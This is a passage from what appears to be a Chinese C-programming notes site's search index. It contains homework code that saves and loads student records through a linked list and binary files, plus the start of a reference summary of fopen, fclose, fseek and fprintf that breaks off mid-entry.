\u91ca\u653e\u94fe\u8868\u5185\u5b58\n    struct Student* temp;\n    while (head != NULL) {\n        temp = head;\n        head = head-&gt;next;\n        free(temp);\n    }\n\n    return 0;\n}\n\n\nvoid save(struct Student* head) {\n\n    // \u6253\u5f00\u6587\u4ef6\u4ee5\u5199\u5165\u4e8c\u8fdb\u5236\u6570\u636e\n    FILE* file = fopen(\"student_data.dat\", \"wb\");\n\n    if (file == NULL) {\n        fprintf(stderr, \"\u65e0\u6cd5\u6253\u5f00\u6587\u4ef6\u8fdb\u884c\u5199\u5165.\\n\");\n        exit(1);\n    }\n\n    // \u5c06\u94fe\u8868\u4e2d\u7684\u5b66\u751f\u6570\u636e\u5199\u5165\u6587\u4ef6\n\n    // \u7528\u8fd9\u4e2a while \u4e5f\u53ef\u4ee5\uff0c\u7528\u4e0b\u9762\u7684 for \u4e5f\u884c\n    //while (head != NULL) {\n    //    fwrite(head, sizeof(struct Student), 1, file);\n    //}\n\n    for (int i = 0; i &lt; SIZE; i++) {\n        if (fwrite(head, sizeof(struct Student), 1, file) == 1) {\n            head = head-&gt;next;\n        }\n        else {\n            printf(\"\u6587\u4ef6\u5199\u5165\u9519\u8bef\\n\");\n        }\n    }\n\n    // \u5173\u95ed\u6587\u4ef6\n    fclose(file);\n}\n\n\nvoid output(struct Student* head) {\n    struct Student read[SIZE];\n    FILE* fp;\n\n    if ((fp = fopen(\"student_data.dat\", \"rb\")) == NULL)\n    {\n        printf(\"\u65e0\u6cd5\u6253\u5f00\u6587\u4ef6\\n\");\n        exit(0);\n    }\n\n    printf(\"\u4ee5\u4e0b\u4e3a\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u7684\u6570\u636e\uff1a\\n\\n\");\n    for (int i = 0; i &lt; SIZE; i++)\n    {\n        fread(&amp;read[i], sizeof(struct Student), 1, fp);\n\n        printf(\"\u5b66\u751f\u5e8f\u53f7 --%d--:\\n\", i + 1);\n        printf(\"\u59d3\u540d\\t\u5b66\u53f7\\t\u5e74\u9f84\\t\u4f4f\u5740\\n\");\n        printf(\"%-7s %-7d %-7d %-7s\\n\",\n            read[i].name, read[i].num,\n            read[i].age, read[i].addr);\n        printf(\"\\n\");\n    }\n    fclose(fp);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%BD%9C%E4%B8%9A/#_2","title":"\u7b2c\u4e8c\u79cd","text":"<p>\u8fd9\u79cd\u5c31\u662f\u6b63\u5e38\u7684\u521b\u5efa ==\u7ed3\u6784\u4f53\u6570\u7ec4== \uff0c\u7136\u540e\u7528 create() \u51fd\u6570 \u521b\u5efa ==\u94fe\u8868== \u3002</p> <p>\u53ef\u4ee5\u81ea\u884c\u5220\u9664 output() \u51fd\u6570\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#define SIZE 10\n\n\n// \u5b9a\u4e49\u5b66\u751f\u7ed3\u6784\u4f53\nstruct Student {\n    char name[10];\n    int num;\n    int age;\n    char addr[15];\n    struct Student* next; // \u94fe\u8868\u6307\u9488\n};\n\n\n// \u51fd\u6570\u58f0\u660e\nvoid input(struct Student stu[]);\nstruct Student* create(struct Student*);\nvoid save(struct Student*);\nvoid output(struct Student*);\n\n\nint main() {\n    struct Student stu[SIZE];\n    struct Student* h;\n\n    // \u4ece\u952e\u76d8\u8f93\u5165\u5b66\u751f\u6570\u636e\n    input(stu);\n\n    // \u521b\u5efa\u94fe\u8868\n    h = create(stu);\n\n    // \u4fdd\u5b58\u5b66\u751f\u6570\u636e\u5230\u78c1\u76d8\u6587\u4ef6\n    save(h);\n    printf(\"\u4fdd\u5b58\u6210\u529f.\\n\\n\");\n\n    // \u8f93\u51fa\u6570\u636e\uff0c\u67e5\u770b\u662f\u5426\u6210\u529f\u4fdd\u5b58\n    output(h);\n\n    return 0;\n}\n\n\n// \u8f93\u5165\u5b66\u751f\u4fe1\u606f\u5230\u6570\u7ec4\uff0cn\u4e3a\u5b66\u751f\u4e2a\u6570\nvoid input(struct Student stu[]) {\n    printf(\"\u8bf7\u8f93\u5165\u5b66\u751f\u4fe1\u606f:\\n\\n\");\n    for (int i = 0; i &lt; SIZE; ++i) {\n\n        // \u4ece\u952e\u76d8\u8f93\u5165\u5b66\u751f\u6570\u636e\n        printf(\"\u5b66\u751f\u5e8f\u53f7 --%d--:\\n\", i + 1);\n        printf(\"\u59d3\u540d: \");\n        scanf(\"%s\", stu[i].name);\n        printf(\"\u5b66\u53f7: \");\n        scanf(\"%d\", &amp;stu[i].num);\n        printf(\"\u5e74\u9f84: \");\n        scanf(\"%d\", &amp;stu[i].age);\n        printf(\"\u4f4f\u5740: \");\n        scanf(\"%s\", stu[i].addr);\n\n        printf(\"\\n\");\n    }\n}\n\n\nstruct Student* create(struct Student stu[]) {\n    struct Student* head = NULL; // \u5934\u6307\u9488\u521d\u59cb\u5316\u4e3a\u7a7a\n    struct Student* tail = NULL; // \u521d\u59cb\u5316\u5c3e\u6307\u9488\u4e3aNULL\n    struct Student* temp;\n\n    for (int i = 0; i &lt; SIZE; i++) {\n        temp = (struct Student*)malloc(sizeof(struct Student)); // \u4e3a\u65b0\u8282\u70b9\u5206\u914d\u5185\u5b58\n        if (temp == NULL) {\n            printf(\"\u5185\u5b58\u5206\u914d\u5931\u8d25\\n\");\n            exit(1);\n        }\n\n        // \u5c06\u6570\u7ec4\u4e2d\u7684\u5b66\u751f\u4fe1\u606f\u590d\u5236\u5230\u65b0\u8282\u70b9\n        strcpy(temp-&gt;name, stu[i].name);\n        temp-&gt;num = stu[i].num;\n        temp-&gt;age = stu[i].age;\n        strcpy(temp-&gt;addr, stu[i].addr);\n        temp-&gt;next = NULL;\n\n        if (head == NULL) {\n            head = temp; // \u5982\u679c\u662f\u7b2c\u4e00\u4e2a\u8282\u70b9\uff0c\u76f4\u63a5\u4f5c\u4e3a\u5934\u8282\u70b9\n        }\n        else {\n            tail-&gt;next = temp; // \u5426\u5219\u52a0\u5165\u5230\u94fe\u8868\u7684\u5c3e\u90e8\n        }\n\n        tail = temp; // \u66f4\u65b0\u5c3e\u6307\u9488\n    }\n\n    return head; // \u8fd4\u56de\u5934\u6307\u9488\n}\n\n\nvoid save(struct Student* head) {\n\n    // \u6253\u5f00\u6587\u4ef6\u4ee5\u5199\u5165\u4e8c\u8fdb\u5236\u6570\u636e\n    FILE* file = fopen(\"student_data.dat\", \"wb\");\n\n    if (file == NULL) {\n        fprintf(stderr, \"\u65e0\u6cd5\u6253\u5f00\u6587\u4ef6\u8fdb\u884c\u5199\u5165.\\n\");\n        exit(1);\n    }\n\n    // \u5c06\u94fe\u8868\u4e2d\u7684\u5b66\u751f\u6570\u636e\u5199\u5165\u6587\u4ef6\n\n    //// \u7528\u8fd9\u4e2a while \u4e5f\u53ef\u4ee5\uff0c\u7528\u4e0b\u9762\u7684 for \u4e5f\u884c\n    //while (head != NULL) {\n    //    fwrite(head, sizeof(struct Student), 1, file);\n    //    head = head-&gt;next;\n    //}\n\n    for (int i = 0; i &lt; SIZE; i++) {\n        if (fwrite(head, sizeof(struct Student), 1, file) == 1) {\n            head = head-&gt;next;\n        }\n        else {\n            printf(\"\u6587\u4ef6\u5199\u5165\u9519\u8bef\\n\");\n        }\n    }\n\n    // \u5173\u95ed\u6587\u4ef6\n    fclose(file);\n}\n\n\nvoid output(struct Student* head) {\n    struct Student read[SIZE];\n    FILE* fp;\n\n    if ((fp = fopen(\"student_data.dat\", \"rb\")) == NULL)\n    {\n        printf(\"\u65e0\u6cd5\u6253\u5f00\u6587\u4ef6\\n\");\n        exit(0);\n    }\n\n    printf(\"\u4ee5\u4e0b\u4e3a\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u7684\u6570\u636e\uff1a\\n\\n\");\n    for (int i = 0; i &lt; SIZE; i++)\n    {\n        fread(&amp;read[i], sizeof(struct Student), 1, fp);\n\n        printf(\"\u5b66\u751f\u5e8f\u53f7 --%d--:\\n\", i + 1);\n        printf(\"\u59d3\u540d\\t\u5b66\u53f7\\t\u5e74\u9f84\\t\u4f4f\u5740\\n\");\n        printf(\"%-7s %-7d %-7d %-7s\\n\",\n            read[i].name, read[i].num,\n            read[i].age, read[i].addr);\n        printf(\"\\n\");\n    }\n    fclose(fp);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%BD%9C%E4%B8%9A/#load","title":"load() \u51fd\u6570\u7248\u672c","text":"<p>\u8fd9\u4e2a\u4f60\u8981\u662f\u60f3\u6d4b\u8bd5\u7684\u8bdd\uff0c\u5c31\u521b\u5efa stu.list \u6587\u4ef6\u8fdb\u884c\u6d4b\u8bd5\uff0c\u6709\u4ee5\u4e0b\u4e09\u79cd\u60c5\u51b5</p> <ul> <li> <p>\u65e0 stu.list \u6587\u4ef6\uff0c\u663e\u793a \"\u65e0\u6cd5\u8f7d\u5165\u6587\u4ef6\" \u3002</p> </li> <li> <p>\u6709 stu.list \u6587\u4ef6\uff0c\u4f46\u5176\u4e2d\u65e0\u6570\u636e\u6216\u6570\u636e\u9519\u8bef\uff08\u9898\u76ee\u8981\u6c42\u662f\u4e8c\u8fdb\u5236\u6570\u636e\uff09\uff0c\u663e\u793a \"\u6587\u4ef6\u8bfb\u53d6\u9519\u8bef\" \u3002</p> </li> <li> <p>\u6709 stu.list \u6587\u4ef6\uff0c\u4e14\u5176\u4e2d\u6570\u636e\u6b63\u5e38\uff0c\u6b63\u5e38\u8bfb\u53d6\u6570\u636e\u3002</p> </li> </ul> <p>\u4f46\u662f\u8fd9\u513f\u5173\u4e8e\u7b2c\u4e09\u79cd\u60c5\u51b5\uff0c\u4e5f\u5c31\u662f\u6b63\u5e38\u60c5\u51b5\uff0c\u6709\u4e00\u4e9b\u4e1c\u897f\u4e1c\u897f\u9700\u8981\u8bf4\u660e\uff1a</p> <ol> <li> <p>\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f\u6b63\u5e38\u8fd0\u884c\u524d\u4e24\u79cd\u7684\u4ee3\u7801\uff0c\u7136\u540e\u751f\u6210 student_data.dat \u6587\u4ef6\uff0c\u518d\u5c06\u8be5\u6587\u4ef6\u91cd\u547d\u540d\u4e3a  stu.list \u3002</p> </li> <li> <p>\u8bf7\u5728\u8d44\u6e90\u7ba1\u7406\u5668\u4e2d\u8fdb\u884c\u8bbe\u7f6e\uff0c\u4f7f \u6587\u4ef6\u540e\u7f00\u540d \u80fd\u6b63\u5e38\u663e\u793a\u3002\u5426\u5219\u5f88\u53ef\u80fd\u51fa\u73b0\u4ee5\u4e0b\u95ee\u9898\uff0c\u4f60\u5c06\u4e00\u4e2a\u6587\u4ef6\u91cd\u547d\u540d\u4e3a  stu.list \uff0c\u7136\u800c\u5b9e\u9645\u4e0a\u5b83\u662f stu.list.txt \u4e5f\u5c31\u662f\u8bf4\u5b83\u5176\u5b9e\u662f\u4e00\u4e2a .txt \u6587\u4ef6\u3002</p> </li> </ol> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#define SIZE 10\n\n\n// \u5b9a\u4e49\u5b66\u751f\u7ed3\u6784\u4f53\nstruct Student {\n    char name[10];\n    int num;\n    int age;\n    char addr[15];\n    struct Student* next; // \u94fe\u8868\u6307\u9488\n};\n\n\n// \u51fd\u6570\u58f0\u660e\nvoid load(struct Student stu[]);\nstruct Student* create(struct Student*);\nvoid save(struct Student*);\nvoid output(struct Student*);\n\n\nint main() {\n    struct Student stu[SIZE];\n    struct Student* h;\n\n    //\u8f7d\u5165\u6570\u636e\n    load(stu);\n\n    // \u521b\u5efa\u94fe\u8868\n    h = create(stu);\n\n    // \u4fdd\u5b58\u5b66\u751f\u6570\u636e\u5230\u78c1\u76d8\u6587\u4ef6\n    save(h);\n    printf(\"\u4fdd\u5b58\u6210\u529f.\\n\\n\");\n\n    // \u8f93\u51fa\u6570\u636e\n    output(h);\n\n    return 0;\n}\n\n\nvoid load(struct Student stu[])\n{\n    FILE* fp;\n\n    if ((fp = fopen(\"stu.list\", \"rb\")) == NULL)\n    {\n        printf(\"\u65e0\u6cd5\u8f7d\u5165\u6587\u4ef6\\n\");\n        exit(1);\n    }\n    for (int i = 0; i &lt; SIZE; i++) {\n        if (fread(&amp;stu[i], sizeof(struct Student), 1, fp) != 1)\n        {\n            if (feof(fp))\n            {\n                fclose(fp);\n                printf(\"\u6587\u4ef6\u8bfb\u53d6\u9519\u8bef\\n\");\n                exit(1);\n            }\n        }\n    }\n\n    fclose(fp);\n}\n\n\nstruct Student* create(struct Student stu[]) {\n    struct Student* head = NULL; // \u5934\u6307\u9488\u521d\u59cb\u5316\u4e3a\u7a7a\n    struct Student* tail = NULL; // \u521d\u59cb\u5316\u5c3e\u6307\u9488\u4e3aNULL\n    struct Student* temp;\n\n    for (int i = 0; i &lt; SIZE; i++) {\n        temp = (struct Student*)malloc(sizeof(struct Student)); // \u4e3a\u65b0\u8282\u70b9\u5206\u914d\u5185\u5b58\n        if (temp == NULL) {\n            printf(\"\u5185\u5b58\u5206\u914d\u5931\u8d25\\n\");\n            exit(1);\n        }\n\n        // \u5c06\u6570\u7ec4\u4e2d\u7684\u5b66\u751f\u4fe1\u606f\u590d\u5236\u5230\u65b0\u8282\u70b9\n        strcpy(temp-&gt;name, stu[i].name);\n        temp-&gt;num = stu[i].num;\n        temp-&gt;age = stu[i].age;\n        strcpy(temp-&gt;addr, stu[i].addr);\n        temp-&gt;next = NULL;\n\n        if (head == NULL) {\n            head = temp; // \u5982\u679c\u662f\u7b2c\u4e00\u4e2a\u8282\u70b9\uff0c\u76f4\u63a5\u4f5c\u4e3a\u5934\u8282\u70b9\n        }\n        else {\n            tail-&gt;next = temp; // \u5426\u5219\u52a0\u5165\u5230\u94fe\u8868\u7684\u5c3e\u90e8\n        }\n\n        tail = temp; // \u66f4\u65b0\u5c3e\u6307\u9488\n    }\n\n    return head; // \u8fd4\u56de\u5934\u6307\u9488\n}\n\n\nvoid save(struct Student* head) {\n\n    // \u6253\u5f00\u6587\u4ef6\u4ee5\u5199\u5165\u4e8c\u8fdb\u5236\u6570\u636e\n    FILE* file = fopen(\"student_data.dat\", \"wb\");\n\n    if (file == NULL) {\n        fprintf(stderr, \"\u65e0\u6cd5\u6253\u5f00\u6587\u4ef6\u8fdb\u884c\u5199\u5165.\\n\");\n        exit(1);\n    }\n\n    // \u5c06\u94fe\u8868\u4e2d\u7684\u5b66\u751f\u6570\u636e\u5199\u5165\u6587\u4ef6\n\n    //// \u7528\u8fd9\u4e2a while \u4e5f\u53ef\u4ee5\uff0c\u7528\u4e0b\u9762\u7684 for \u4e5f\u884c\n    //while (head != NULL) {\n    //    fwrite(head, sizeof(struct Student), 1, file);\n    //    head = head-&gt;next;\n    //}\n\n    for (int i = 0; i &lt; SIZE; i++) {\n        if (fwrite(head, sizeof(struct Student), 1, file) == 1) {\n            head = head-&gt;next;\n        }\n        else {\n            printf(\"\u6587\u4ef6\u5199\u5165\u9519\u8bef\\n\");\n        }\n    }\n\n    // \u5173\u95ed\u6587\u4ef6\n    fclose(file);\n}\n\n\nvoid output(struct Student* head) {\n    struct Student read[SIZE];\n    FILE* fp;\n\n    if ((fp = fopen(\"student_data.dat\", \"rb\")) == NULL)\n    {\n        printf(\"\u65e0\u6cd5\u6253\u5f00\u6587\u4ef6\\n\");\n        exit(0);\n    }\n\n    printf(\"\u4ee5\u4e0b\u4e3a\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u7684\u6570\u636e\uff1a\\n\\n\");\n    for (int i = 0; i &lt; SIZE; i++)\n    {\n        fread(&amp;read[i], sizeof(struct Student), 1, fp);\n\n        printf(\"\u5b66\u751f\u5e8f\u53f7 --%d--:\\n\", i + 1);\n        printf(\"\u59d3\u540d\\t\u5b66\u53f7\\t\u5e74\u9f84\\t\u4f4f\u5740\\n\");\n        printf(\"%-7s %-7d %-7d %-7s\\n\",\n            read[i].name, read[i].num,\n            read[i].age, read[i].addr);\n        printf(\"\\n\");\n    }\n    fclose(fp);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/","title":"\u6587\u4ef6\u8bfb\u5199\u5e38\u7528\u51fd\u6570\u603b\u7ed3","text":""},{"location":"DEC/C/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/#_1","title":"\u76ee\u5f55","text":"<ul> <li>C \u8bed\u8a00\u6587\u4ef6\u8bfb\u5199\u5e38\u7528\u51fd\u6570\u603b\u7ed3</li> <li> <ul> <li>fopen \u51fd\u6570</li> <li>fclose \u51fd\u6570</li> <li>fseek \u51fd\u6570</li> <li>fprintf \u51fd\u6570</li> <li>fsanf \u51fd\u6570</li> <li>feof \u51fd\u6570</li> <li>fgetc \u51fd\u6570</li> <li>fputc \u51fd\u6570</li> <li>fwrite \u51fd\u6570</li> <li>ftell \u51fd\u6570</li> <li>rewind \u51fd\u6570</li> </ul> </li> </ul>"},{"location":"DEC/C/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/#fopen","title":"fopen \u51fd\u6570","text":"<ul> <li>\u5934\u6587\u4ef6\uff1astdio.h</li> <li>\u539f\u578b\uff1a FILE fopen(const char filename, const char *mode);</li> <li>\u4f5c\u7528\uff1a \u4f7f\u7528\u7ed9\u5b9a\u7684\u6a21\u5f0f mode \u6253\u5f00 filename \u6240\u6307\u5411\u7684\u6587\u4ef6\u3002</li> <li>\u53c2\u6570\uff1a<ul> <li>filename: \u6240\u9700\u6253\u5f00\u6587\u4ef6\u7684\u6587\u4ef6\u540d\u3002</li> <li>mode: \u8bbf\u95ee\u6a21\u5f0f\uff0c\u5982\u4e0b\u8868\u3002</li> </ul> </li> </ul> \u53c2\u6570\u529f\u80fdr\u4ee5\u53ea\u8bfb\u65b9\u5f0f\u6253\u5f00\u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u5fc5\u987b\u5b58\u5728\u3002r+\u4ee5\u8bfb / \u5199\u65b9\u5f0f\u6253\u5f00\u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u5fc5\u987b\u5b58\u5728\u3002rb+\u4ee5\u8bfb / \u5199\u65b9\u5f0f\u6253\u5f00\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u53ea\u5141\u8bb8\u8bfb / \u5199\u6570\u636e\u3002rt+\u4ee5\u8bfb / \u5199\u65b9\u5f0f\u6253\u5f00\u4e00\u4e2a\u6587\u672c\u6587\u4ef6\uff0c\u5141\u8bb8\u8bfb\u548c\u5199\u3002w\u6253\u5f00\u53ea\u5199\u6587\u4ef6\uff0c\u82e5\u6587\u4ef6\u5b58\u5728\u5219\u6587\u4ef6\u957f\u5ea6\u6e05\u4e3a\u96f6\uff0c\u5373\u8be5\u6587\u4ef6\u5185\u5bb9\u4f1a\u6d88\u5931\uff1b\u82e5\u6587\u4ef6\u4e0d\u5b58\u5728\u5219\u521b\u5efa\u8be5\u6587\u4ef6\u3002w+\u6253\u5f00\u53ef\u8bfb / \u5199\u6587\u4ef6\uff0c\u82e5\u6587\u4ef6\u5b58\u5728\u5219\u6587\u4ef6\u957f\u5ea6\u6e05\u4e3a\u96f6\uff0c\u5373\u8be5\u6587\u4ef6\u5185\u5bb9\u4f1a\u6d88\u5931\uff1b\u82e5\u6587\u4ef6\u4e0d\u5b58\u5728\u5219\u521b\u5efa\u8be5\u6587\u4ef6\u3002a\u4ee5\u9644\u52a0\u7684\u65b9\u5f0f\u6253\u5f00\u53ea\u5199\u6587\u4ef6\u3002\u82e5\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u5219\u4f1a\u521b\u5efa\u8be5\u6587\u4ef6\uff1b\u5982\u679c\u6587\u4ef6\u5b58\u5728\uff0c\u5219\u5199\u5165\u7684\u6570\u636e\u4f1a\u88ab\u52a0\u5230\u6587\u4ef6\u5c3e\u540e\uff0c\u5373\u6587\u4ef6\u539f\u5148\u7684\u5185\u5bb9\u4f1a\u88ab\u4fdd\u7559\uff08EOF \u7b26\u4fdd\u7559\uff09\u3002a+\u4ee5\u9644\u52a0\u65b9\u5f0f\u6253\u5f00\u53ef\u8bfb / \u5199\u7684\u6587\u4ef6\u3002\u82e5\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u5219\u4f1a\u521b\u5efa\u8be5\u6587\u4ef6\uff0c\u5982\u679c\u6587\u4ef6\u5b58\u5728\uff0c\u5219\u5199\u5165\u7684\u6570\u636e\u4f1a\u88ab\u52a0\u5230\u6587\u4ef6\u5c3e\u540e\uff0c\u5373\u6587\u4ef6\u539f\u5148\u7684\u5185\u5bb9\u4f1a\u88ab\u4fdd\u7559\uff08EOF \u7b26\u4e0d\u4fdd\u7559\uff09\u3002wb\u4ee5\u53ea\u5199\u65b9\u5f0f\u6253\u5f00\u6216\u65b0\u5efa\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u53ea\u5141\u8bb8\u5199\u6570\u636e\u3002wb+\u4ee5\u8bfb / \u5199\u65b9\u5f0f\u6253\u5f00\u6216\u65b0\u5efa\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5141\u8bb8\u8bfb\u548c\u5199\u3002wt+\u4ee5\u8bfb / \u5199\u65b9\u5f0f\u6253\u5f00\u6216\u65b0\u5efa\u4e00\u4e2a\u6587\u672c\u6587\u4ef6\uff0c\u5141\u8bb8\u8bfb\u548c\u5199\u3002at+\u4ee5\u8bfb / \u5199\u65b9\u5f0f\u6253\u5f00\u4e00\u4e2a\u6587\u672c\u6587\u4ef6\uff0c\u5141\u8bb8\u8bfb\u6216\u5728\u6587\u672c\u672b\u8ffd\u52a0\u6570\u636e\u3002ab+\u4ee5\u8bfb / \u5199\u65b9\u5f0f\u6253\u5f00\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5141\u8bb8\u8bfb\u6216\u5728\u6587\u4ef6\u672b\u8ffd\u52a0\u6570\u636e\u3002 <ul> <li>\u8fd4\u56de\u503c\uff1a     \u6587\u4ef6\u987a\u5229\u6253\u5f00\u540e\uff0c\u6307\u5411\u8be5\u6d41\u7684\u6587\u4ef6\u6307\u9488\u5c31\u4f1a\u88ab\u8fd4\u56de\u3002\u5982\u679c\u6587\u4ef6\u6253\u5f00\u5931\u8d25\u5219\u8fd4\u56de NULL\uff0c\u5e76\u628a\u9519\u8bef\u4ee3\u7801\u5b58\u5728 error \u4e2d\u3002</li> <li>\u8fd0\u7528</li> </ul> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main()\n{\n    FILE *fp;\n    fp = fopen(\"abc.txt\", \"r\");/* \u4ee5\u53ea\u8bfb\u7684\u65b9\u5f0f\u6253\u5f00\uff0c\"abc.txt\"\u6587\u4ef6 */\n    if (NULL == fp) /* \u6253\u5f00\u5931\u8d25 */\n    {\n        printf(\"\u9519\u8bef\uff01\");\n        exit(1); /* \u4e2d\u6b62\u7a0b\u5e8f */\n    }\n    fclose(fp); /* \u5173\u95ed\u6587\u4ef6 */\n    fp = NULL; /* \u9700\u8981\u6307\u5411\u7a7a\uff0c\u5426\u5219\u4f1a\u6307\u5411\u539f\u6253\u5f00\u6587\u4ef6\u5730\u5740 */\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/#fclose","title":"fclose \u51fd\u6570","text":"<ul> <li>\u5934\u6587\u4ef6\uff1astdio.h</li> <li>\u539f\u578b\uff1a int fclose(FILE *fp);</li> <li>\u4f5c\u7528\uff1a \u628a\u7f13\u51b2\u533a\u5185\u6700\u540e\u5269\u4f59\u7684\u6570\u636e\u8f93\u51fa\u5230\u5185\u6838\u7f13\u51b2\u533a\uff0c\u5e76\u91ca\u653e\u6587\u4ef6\u6307\u9488\u548c\u6709\u5173\u7684\u7f13\u51b2\u533a\u3002</li> <li>\u53c2\u6570\uff1a<ul> <li>fp: \u6307\u5411 FILE \u5bf9\u8c61\u7684\u6307\u9488\uff0c\u8be5 FILE \u5bf9\u8c61\u6307\u5b9a\u4e86\u8981\u88ab\u5173\u95ed\u7684\u6d41</li> </ul> </li> <li>\u8fd4\u56de\u503c\uff1a\u5982\u679c\u6d41\u6210\u529f\u5173\u95ed\uff0cfclose \u8fd4\u56de 0\uff0c\u5426\u5219\u8fd4\u56de EOF\uff08-1\uff09\u3002</li> <li>\u8fd0\u7528\uff1a</li> </ul> C<pre><code>int main()\n{\n    FILE *fp;\n    fp = fopen(\"abc.txt\", \"r\");/* \u4ee5\u53ea\u8bfb\u7684\u65b9\u5f0f\u6253\u5f00\uff0c\"abc.txt\"\u6587\u4ef6 */\n    if (NULL == fp) /* \u6253\u5f00\u5931\u8d25 */\n    {\n        printf(\"\u9519\u8bef\uff01\");\n        exit(1); /* \u4e2d\u6b62\u7a0b\u5e8f */\n    }\n    fclose(fp); /* \u5173\u95ed\u6587\u4ef6 */\n    fp = NULL; /* \u9700\u8981\u6307\u5411\u7a7a\uff0c\u5426\u5219\u4f1a\u6307\u5411\u539f\u6253\u5f00\u6587\u4ef6\u5730\u5740 */\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/#fseek","title":"fseek \u51fd\u6570","text":"<ul> <li>\u5934\u6587\u4ef6\uff1astdio.h</li> <li>\u539f\u578b\uff1a int fseek(FILE *stream, long offset, int fromwhere);</li> <li>\u4f5c\u7528\uff1a \u91cd\u5b9a\u4f4d\u6d41 (\u6570\u636e\u6d41 / \u6587\u4ef6) \u4e0a\u7684\u6587\u4ef6\u5185\u90e8\u4f4d\u7f6e\u6307\u9488<ul> <li>\u6ce8\u610f\uff1a\u6587\u4ef6\u6307\u9488\u6307\u5411\u6587\u4ef6 / \u6d41\u3002\u4f4d\u7f6e\u6307\u9488\u6307\u5411\u6587\u4ef6\u5185\u90e8\u7684\u5b57\u8282\u4f4d\u7f6e\uff0c\u968f\u7740\u6587\u4ef6\u7684\u8bfb\u53d6\u4f1a\u79fb\u52a8\uff0c\u6587\u4ef6\u6307\u9488\u5982\u679c\u4e0d\u91cd\u65b0\u8d4b\u503c\u5c06\u4e0d\u4f1a\u6539\u53d8\u6216\u6307\u5411\u522b\u7684\u6587\u4ef6\u3002</li> </ul> </li> <li>\u53c2\u6570\uff1a<ul> <li>stream\uff1a\u6587\u4ef6\u6307\u9488</li> <li>offset\uff1a\u504f\u79fb\u91cf\uff0c\u6b63\u6570\u8868\u793a\u6b63\u5411\u504f\u79fb\uff0c\u8d1f\u6570\u8868\u793a\u8d1f\u5411\u504f\u79fb</li> <li>origin\uff1a\u8bbe\u5b9a\u4ece\u6587\u4ef6\u7684\u54ea\u91cc\u5f00\u59cb\u504f\u79fb, \u53ef\u80fd\u53d6\u503c\u4e3a\uff1aSEEK_CUR\u3001 SEEK_END \u6216 SEEK_SET<ul> <li>SEEK_SET\uff1a \u6587\u4ef6\u5f00\u5934</li> <li>SEEK_CUR\uff1a \u5f53\u524d\u4f4d\u7f6e</li> <li>SEEK_END\uff1a \u6587\u4ef6\u7ed3\u5c3e \u5176\u4e2d SEEK_SET,SEEK_CUR \u548c SEEK_END \u5bf9\u5e94\u6570\u5b57\u4f9d\u6b21\u4e3a 0\uff0c1 \u548c 2.</li> </ul> </li> </ul> </li> <li>\u8fd4\u56de\u503c\uff1a\u6210\u529f\uff0c\u8fd4\u56de 0\uff0c\u5931\u8d25\u8fd4\u56de\u975e 0 \u503c\uff0c\u5e76\u8bbe\u7f6e error \u7684\u503c\uff0c\u53ef\u4ee5\u7528 perror() \u51fd\u6570\u8f93\u51fa\u9519\u8bef\u3002</li> <li>\u8fd0\u7528</li> </ul> C<pre><code>fseek(fp,100L,0);  //\u628afp\u6307\u9488\u79fb\u52a8\u5230\u79bb\u6587\u4ef6\u5f00\u5934100\u5b57\u8282\u5904\uff1b\n    fseek(fp,100L,1);  //\u628afp\u6307\u9488\u79fb\u52a8\u5230\u79bb\u6587\u4ef6\u5f53\u524d\u4f4d\u7f6e100\u5b57\u8282\u5904\uff1b\n    fseek(fp,-100L,2); //\u628afp\u6307\u9488\u9000\u56de\u5230\u79bb\u6587\u4ef6\u7ed3\u5c3e100\u5b57\u8282\u5904\u3002\n</code></pre>"},{"location":"DEC/C/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/#fprintf","title":"fprintf \u51fd\u6570","text":"<ul> <li> <p>\u5934\u6587\u4ef6\uff1astdio.h</p> </li> <li> <p>\u539f\u578b\uff1a int fprintf (FILE stream, const charformat, [argument])</p> </li> <li> <p>\u4f5c\u7528\uff1a \u6839\u636e\u6307\u5b9a\u7684\u683c\u5f0f (format)\uff0c\u5411\u8f93\u51fa\u6d41(stream) \u5199\u5165\u6570\u636e(argument)(\u548c printf 